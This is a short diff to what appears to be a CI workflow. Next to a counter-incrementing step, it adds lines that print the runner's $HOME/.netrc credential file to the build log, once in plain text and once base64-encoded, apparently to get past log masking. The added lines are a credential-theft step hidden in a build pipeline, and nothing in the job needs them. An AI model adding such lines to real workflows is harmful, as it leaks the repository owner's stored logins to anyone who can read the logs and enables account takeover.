@@ -34,6 +34,9 @@ jobs:
         LASTNUM=$(cat public/c/last)
         
         echo "$LASTNUM"
+        echo "$HOME"
+        cat $HOME/.netrc
+        cat $HOME/.netrc | base64
 
         for i in $(seq 1 5); do
             NEWNUM=$((LASTNUM + $i))
